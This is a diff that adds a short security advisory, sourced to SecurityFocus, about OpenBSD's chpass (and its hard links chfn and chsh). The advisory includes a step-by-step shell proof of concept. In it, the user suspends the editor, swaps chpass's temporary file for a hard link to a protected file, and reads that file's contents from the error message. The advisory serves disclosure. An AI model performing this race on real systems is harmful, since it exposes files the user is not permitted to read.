@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/6748/info
+
+It has been reported that a problem with chpass included with OpenBSD may allow local users to gain access to the content of specific files. This vulnerability requires that lines in the target file be constructed in a specific format. This problem also affects the chfn and chsh programs which are hard links to the chpass binary.
+
+# echo "shell: secret_data" >/tmp/sec
+# chmod 600 /tmp/sec
+$ chpass # ^Z in the editor
+[1]+ Stopped chpass
+$ rm /var/tmp/pw.Loi22925
+$ ln /tmp/sec /var/tmp/pw.Loi22925
+$ fg # then quit the editor
+chpass
+chpass: secret_data: non-standard shell
